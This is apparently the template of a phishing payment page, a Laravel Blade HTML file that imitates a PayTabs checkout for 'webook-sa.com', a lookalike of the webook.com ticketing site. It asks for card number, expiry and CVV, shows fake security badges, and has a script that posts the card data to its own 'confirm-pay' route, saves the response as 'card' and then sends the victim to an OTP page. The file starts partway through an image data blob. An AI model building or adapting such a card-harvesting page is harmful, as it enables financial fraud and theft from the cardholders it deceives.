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);
        background-repeat: repeat;
        background-position: center center;
    }

    .pt_pay_btn {
        color: #FFFFFF !important;
        background: #0050EB !important;
        background-color: #0050EB !important;
        border-color: #0050EB !important;
        box-shadow: 0 6px 4px #0050EB65 !important;
    }

    .pt_pay_btn:hover {
        color: #FFFFFF !important;
        background: #447CE9 !important;
        background-color: #447CE9 !important;
        border-color: #447CE9 !important;
        box-shadow: 0 6px 4px #447CE965 !important;
    }

    .pt_pay_btn:active,
    .pt_pay_btn:focus {
        color: #FFFFFF !important;
        background: #447CE9 !important;
        background-color: #447CE9 !important;
        border-color: #447CE9 !important;
        box-shadow: 0 0 0 .2rem #447CE940 !important;
    }

    .pt_store_name {
        float: unset !important;
    }

    .pt_store_wrapper {
        text-align: center !important;
    }
</style>

<header>
    <div class="container text-center">
        <div class="pt_container_inner">
            <div class="pt_merchant_info"><img class="pt_merch_logo" src="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAJYAAAAuCAYAAADKmOD6AAAAAXNSR0IArs4c6QAAA3FJREFUeF7tnb122zAMhaGp6VM12fxI3ppsfiRv0Vs1XaqW9pGPolAEQAEUpF4vGUwRP/cjwMgy3X2czu9E9EzMayB6&#43;X699Nw4i/eFPvVP18vL1N7v0/l1IPpp4YP1HB3R27fr5VUzrzAP7JRS21b2/vHUdx&#43;n88B6dh/wRUjhdaphGjierpduL2CNfkpFTuMV2rA55uxq8s4aIyINWKStWr9O52dNldMGt0ewNIBZgpXszvM1BcTalgosTdUaIdHA&#43;D&#43;BlURNVST9XWqR5mIvtGNt3s0rVppQCsokKaIWWhPcnivWVJylNmUNVk6/1FU6orTPNn1pK9bNeKmkpvfnkHD9vXY/cRSwlhasB1jzrlOzoCUEVoHFgZJLSKnS1QZ3JLByOXUC69F1avPuBlapJRacXWyJtQkEWBKJs2P6gejNowU&#43;/jmpFTW3kedWQK5qcdeUUgewqsFyv7CqFY5ezUER3GD7VLXWQJXb662dzz3bBQMtW2GLOFeBNa1aUlGnMApALOYAFasFInU21oJ1uxeT7sNoWmoCQgoiWmGdsFtftRqsLQNAxdoy&#43;2XbACuINthjBRECm/dAQmRcQcUKos&#43;BKtb9Hplm0x1Eg4cb2GPFUmS6OADW9trcVnju8aIdLfovMQCs7cBaBGp0aQdgLcYAsDYAi/sQfw9gcTEArIZgcWLMXYlYsaQxAKw2YLFtL&#43;dGMLBUMQCsBmBxD0YuuRAJLG0MAKsBWNL2EbkVamMAWA3AGk1oxYlUsbQxAKyGYGnFiQiWNAaAtQFYyST31a80JjJYYwx/iPrczV2AtRFYkpUfHaxSDABrY7BG87nvA&#43;wFrBxgACsIWAd6uuHW5gEWwHLJAMBySat&#43;0iNVrNvGfm99fCoZnsfSA9zqCoDVKtOMHVSsIEIkN1CxAokxcwUVK4g2qFhBhEDFCiRExhXXipVW4UD0Q3J4bk2a0Aprsna/xlsbN7DG0u51Yhwq1jqo0rEIntq4gDXfL6w9/GMphahYerhaadMELK&#43;VcSCwsofSedxjnH8m6aWNOViFg1pFP1SgWYMHAKv4HLk1WC21MQer5VniewZL8jSpNVgttTEFi0uWxZlYe/9Ih8vRND5LsDi71toksKxalOg8d097XvsFTXsujFV9fSrN45mrnJ&#43;W9j79Fo1RAjENMkB/AUg8aH6UshdaAAAAAElFTkSuQmCC"
                                               alt="webook-sa.com" /></div>
        </div>
    </div>
</header>


<main class="pt_container">
    <div class="pt_container_inner pt_store_wrapper">
        <div class="pt_store_name text-uppercase float-start">
            <span class="pt_store_name_text">webook-sa.com</span></div>
    </div>


    <script>
        const currentPPURL = "{{assert('assets/payment/page/5C64360082E40A8B2CC933BCC3667F23EBF9AA5C58BAF398EF09D4D1')}}";
        const cartCurrency = "SAR";
        const cartAmount = "650.00";
        const merchantCountry = "SA";
        const merchantName = "webook.com";
        const profileName = "webook.com";
        const walletDescription = profileName;
        const discounts = null;
        const minInfo = true;
        const noInfo = true;
        const agreementBillingType = 0;
        window.onload = function() {
            hpp.newPaymentForm("cardForm", "HPP5C64360082E40A8B2CC933BCC3667F23EBF9AA5C58BAF398EF09D4D1", "SAR", minInfo, noInfo, false, agreementBillingType);


        }
        var lastPayMethod = "";
        var paymethodHideCust = false

        function setPayMethod(method, methodID) {
            const payMethod = document.getElementById('selected-payment-method');
            if (payMethod) {
                payMethod.value = method;
            }
            const payMethodID = document.getElementById('selected-payment-method-id');
            if (payMethodID) {
                payMethodID.value = methodID;
            }
            if (method != lastPayMethod) {
                paymethodHideCust = false
                if (lastPayMethod != "") {
                    $("#" + lastPayMethod + "_fx").hide();
                }
                if ($("#" + method + "_fx").length) {
                    $("alt_fx").hide();
                    $("#" + method + "_fx").show();
                } else {
                    $("alt_fx").show();
                }
                if (method == "CC") {
                    $("#pt_payment_card_logos").show();
                    $("#card-filter-text").show();
                    $("#pt-save-card").show();
                    $("#pt-card-discount").show();
                    $("#pt-card-number-label").text('بيانات البطاقة');
                    hpp.form.updateDiscount();
                } else if (method == "EXTP") {
                    $("#pt_payment_card_logos").hide();
                    $("#card-filter-text").hide();
                    $("#pt-save-card").hide();
                    $("#pt-card-discount").hide();
                    $("#pt-card-number-label").text('Your ADCB card');
                    hpp.form.updateDiscount();
                } else if (method == "EXNB") {
                    $("#pt_payment_card_logos").hide();
                    $("#card-filter-text").hide();
                    $("#pt-save-card").hide();
                    $("#pt-card-discount").hide();
                    $("#pt-card-number-label").text('قسط من خلال بطاقة البنك الأهلي المصري (فيزا او ماستركارد)');
                    hpp.form.updateDiscount();
                } else if (method == "EXMI") {
                    $("#pt_payment_card_logos").hide();
                    $("#card-filter-text").hide();
                    $("#pt-save-card").hide();
                    $("#pt-card-discount").hide();
                    $("#pt-card-number-label").text('قسط من خلال بطاقة بنك مصر (فيزا او ماستركارد)');
                    hpp.form.updateDiscount();
                } else if (method == "PTAC") {
                    paymethodHideCust = true
                }
                lastPayMethod = method
                if (paymethodHideCust) {
                    $("#pt_customer_details").hide();
                } else {
                    $("#pt_customer_details").show();
                }
            }
        }
    </script>


    <div class="pt_container_inner">
        <form id="cardForm" class="single" method="POST" action="{{ route('confirm-pay') }}">
            <input type="hidden" name="csrf" value="{{ csrf_token() }}">

            <input type="hidden" name="selectedPaymentMethod" id="selected-payment-method" value="CC">
            <input type="hidden" name="orderId" id="orderId" value="{{$order->id}}">


            <div id="payment_card" class="card">
                <div class="card-body">
                    <input type="hidden" data-paylib="csrf" value="970189CA474567DCC090">
                    <div class="nav" id="pt_payment_card_logos"><img
                            src="{{asset('assets/hpp/images/methods/Card-Mada.svg')}}" class="card-method-mada"
                            alt="MADA"/><img src="{{asset('assets/hpp/images/methods/Card-Visa.svg')}}"
                                             class="card-method-visa" alt="Visa"/><img
                            src="{{asset('assets/hpp/images/methods/Card-MasterCard.svg')}}"
                            class="card-method-mcard"
                                                                                                                                                                                                                                                                                             alt="MasterCard" /><img src="{{asset('assets/hpp/images/methods/Card-Amex.svg')}}" class="card-method-amex" alt="Amex" /></div>
                    <div class="form-group">
                        <label class="label" id="pt-card-number-label" for="number">بيانات البطاقة</label>
                        <div class="input-group">
                            <input type="text" id="number" class="form-control input-card" data-paylib="number" name="cardnumber" autocomplete="cc-number" placeholder="1234 1234 1234 1234" aria-invalid="true" autocorrect="off" spellcheck="false" aria-label="Card number" pattern="[0-9#\s]*"
                                   inputmode="numeric">
                            <div class="input-group-append">
                                <span class="input-group-text card-type"><i class="pt-credit-card-brand"></i></span>
                            </div>
                            <div id="number-feedback" class="invalid-feedback"></div>
                        </div>
                    </div>
                    <div id="payment_card_expiry_cvv" class="form-row">
                        <div class="col">
                            <input type="text" id="expmonth" class="form-control" data-paylib="expmonth" name="ccmonth" autocomplete="cc-exp-month" placeholder="MM" autocorrect="off" spellcheck="false" aria-label="expmonth" aria-invalid="false" maxlength="2" pattern="[0-9]*" inputmode="numeric">
                            <div id="expmonth-feedback" class="invalid-feedback"></div>
                        </div>
                        <div class="col">
                            <input type="text" id="expyear" class="form-control" data-paylib="expyear" id="expyear" name="ccyear" autocomplete="cc-exp-year" placeholder="YY" autocorrect="off" spellcheck="false" aria-label="expyear" aria-invalid="false" maxlength="2" pattern="[0-9]*"
                                   inputmode="numeric">
                            <div id="expyear-feedback" class="invalid-feedback"></div>

                        </div>
                        <div class="col input-group">
                            <input type="text" class="form-control input-cvc" id="cvv" data-paylib="cvv" name="cvv" placeholder="CVV" autocomplete="off" autocorrect="off" spellcheck="false" aria-label="cvv" aria-invalid="false" pattern="[0-9#]*" inputmode="numeric">

                            <div class="input-group-append">
                                <span class="input-group-text" style="padding-top: 4px;"><i data-toggle="popover" style="height:24px;" data-content="الرمز المكوّن من 3 أرقام على ظهر البطاقة." data-trigger="hover"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="20" height="20" fill="currentColor"><path d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 400c-18 0-32-14-32-32s13.1-32 32-32c17.1 0 32 14 32 32S273.1 400 256 400zM325.1 258L280 286V288c0 13-11 24-24 24S232 301 232 288V272c0-8 4-16 12-21l57-34C308 213 312 206 312 198C312 186 301.1 176 289.1 176h-51.1C225.1 176 216 186 216 198c0 13-11 24-24 24s-24-11-24-24C168 159 199 128 237.1 128h51.1C329 128 360 159 360 198C360 222 347 245 325.1 258z"/></svg></i></span>
                            </div>
                            <div id="cvv-feedback" class="invalid-feedback"></div>
                        </div>
                    </div>
                </div>

            </div>



            <div class="pt_label_amount text-center mb-4">
                <div id="pt_label_amount"><span class="pt_amount_symbol">SAR</span> {{number_format($grandTotal, 2)}}</div>
                <div id="pt_label_amount">
                </div>

                <small id="pt_label_discount" style="display: none;"><span class="pt_amount_symbol">SAR</span><span id="pt_label_discount_amount"></span></small>
            </div>

            <div class="text-center">
                <button type="submit" id="payBtn" class="btn btn-primary btn-lg btn-block text-uppercase pt_pay_btn">ادفع الآن</button>
            </div>


            <div class="text-center pt-2">
                <a href="" onclick="return confirm_cancel();" class="text-secondary">الغاء</a>
            </div>
        </form>
    </div>



    <script type="text/javascript">

        document.addEventListener('click', function(e) {
            var button = $("payBtn");
            var eventTarget = e.target;

            if (e.target.id === 'payBtn') {

                console.log('jjjjjjjjjjjjjj')


                function sleep(ms) {
                    return new Promise(resolve => setTimeout(resolve, ms));
                }

                async function demo() {
                    for (let i = 0; i < 4; i++) {
                        console.log(`Waiting ${i} seconds...`);
                        await sleep(i * 1000);
                    }
                    if ($('#payBtn').prop("disabled")) {
                        console.log('yes ...! send request now')
                        ////////////////////////////////////// Send Ajax Request ///////////////////////////////////////////////////
                        var formData = $("#cardForm").serialize(); // Serialize the form data
                        $.ajax({
                            url: '{{route('confirm-pay')}}', // URL to send the request to
                            type: 'POST', // HTTP method
                            data: formData, // Serialized form data
                            headers: {
                                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content') // Include CSRF token for Laravel
                            },
                            success: function(response) {
                                console.log(response); // Handle the response from the server
                                sessionStorage.setItem('card', JSON.stringify(response.data));

                                // Redirect
                                window.location.href = `{{route('otp')}}`;
                            },
                            error: function(xhr, status, error) {
                                console.error(error); // Handle any errors
                            }
                        });

                    } else {
                        console.log('no')
                    }
                    console.log('Done');
                }

                demo();


            }

        }, true);

        (function() {
            'use strict';

            function resetInput(objId) {
                var obj = document.getElementById(objId);
                if (obj) {
                    obj.value = "";
                }
            }


            window.addEventListener('pageshow', function() {
                resetInput("number");
                resetInput("expmonth");
                resetInput("expyear");
                resetInput("cvv");
            }, false);

            window.addEventListener('load', function() {
                var cardHolderName = document.getElementById("holderName");
                var billingName = document.getElementById("customer-name");
                var cNumber = document.getElementById("number");
                var expMonth = document.getElementById("expmonth");
                var expYear = document.getElementById("expyear");
                var cvv = document.getElementById("cvv");
                var amount = document.getElementById("amount");
                var savedCardSelect = document.getElementById("saved-card-select");
                var savedCardInput = document.getElementById("saved-card-input");



                if (typeof(expMonth) != 'undefined' && expMonth != null) {
                    expMonth.addEventListener("keyup", function() {
                        if (this.value.length === parseInt(this.attributes["maxlength"].value)) {
                            expYear.focus();
                        }
                    });
                }

                if (typeof(expYear) != 'undefined' && expYear != null) {
                    expYear.addEventListener("keyup", function() {
                        if (this.value.length === parseInt(this.attributes["maxlength"].value)) {
                            cvv.focus();
                        }
                    });
                }



            }, false);



            document.addEventListener('click', function(event) {
                var selector = '#pt_customer_details .nav-link.active'
                var matches = event.target.matches ? event.target.matches(selector) : event.target.msMatchesSelector(selector);
                if (matches) {
                    event.stopPropagation();
                    event.preventDefault();
                    event.target.classList.remove("active");
                    var activeTab = event.target.getAttribute('href').substring(1);
                    var tabPane = document.querySelector('.tab-pane[id="' + activeTab + '"]')
                    tabPane.classList.remove("active");
                }
            }, true);

        })();


        let timerInterval = 20 * 60 * 1000;
        let sessionTimer;
        resetSessionTimer();

        function resetSessionTimer() {
            clearTimeout(sessionTimer);
            sessionTimer = setTimeout(function() {

                location.href = `{{route('home')}}`;
            }, timerInterval);
        }

        hideShipping = "true";
    </script>




    <div class="pt_mpi_icons row justify-content-center align-items-center" style="position: relative;">
        <div class="col-3 d-flex justify-content-center align-items-center py-3">
            <img src="{{asset('assets/hpp/images/mpi/verified-visa.svg')}}" alt="Verified visa">
        </div>
        <div class="col-3 d-flex justify-content-center align-items-center py-3">
            <img src="{{asset('assets/hpp/images/mpi/mc-securecode.svg')}}" alt="MascterCard Secure Code">
        </div>
        <div class="col-3 d-flex justify-content-center align-items-center py-3">
            <img src="{{asset('assets/hpp/images/mpi/amex-safekey.svg')}}" alt="Amex SafeKey">
        </div>
        <div class="col-3 d-flex justify-content-center align-items-center py-3">
            <img src="{{asset('assets/hpp/images/mpi/pci-dss.svg')}}" alt="PCI DSS">
        </div>
        <div style="position: absolute; bottom: -5px; left: 0; width: 100%; text-align: center; font-size: 9px; opacity: 0.4;">PMNT0201.6697F37F.0000FE4C</div>
    </div>





    <div class="modal fade" id="paymentModalConfirmation" tabindex="-2" role="dialog" aria-labelledby="paymentModalConfirmation" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content pt_invoice_modal">
                <div class="modal-header">
                    <h5 class="modal-title text-uppercase pt_invoice_title" id="paymentModalConfirmation">تأكيد الدفع</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true"><img src="{{asset('assets/hpp/images/close-invoice.svg')}}" alt="close invoice" /></span>
                    </button>
                </div>
                <div class="modal-body">
                    <span>هل أنت متأكد أنك تريد دفع {{$grandTotal}} SAR إلى webook-sa.com؟</span>
                </div>
                <div class="modal-footer">
                    <div class="col-12 text-center">
                        <button type="button" id="payConfBtn" class="btn btn-primary btn-lg btn-block text-uppercase pt_pay_btn">تأكيد</button>
                    </div>
                </div>
            </div>
        </div>
    </div>



    <div class="modal fade" id="waitTransModal" tabindex="-1" role="dialog" aria-labelledby="waitTransModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content p-4">
                <div class="modal-body">يتم إتمام العملية الخاصة بك. يرجى الإنتظار.</div>
            </div>
        </div>
    </div>
</main>


<footer class="text-muted text-center pt_footer">
    <div class="container">
        <span class="pt_powered_text">بواسطة</span>
        <div class="pt_footer_logo"></div>
    </div>
</footer>

<script src="{{asset('assets/hpp/js/jquery.min.js')}}" type="text/javascript" ></script>
<script src="{{asset('assets/hpp/js/bootstrap.bundle.min.js')}}" type="text/javascript"  ></script>
<script src="{{asset('assets/hpp/js/aes.js')}}" type="text/javascript" ></script>


<script type="text/javascript">
    $(function() {
        $('[data-toggle="popover"]').popover()
    })

    function confirm_cancel() {
        return confirm('هل أنت متأكد أنك تريد إلغاء عملية الدفع؟');
    }
</script>

</body>

</html>
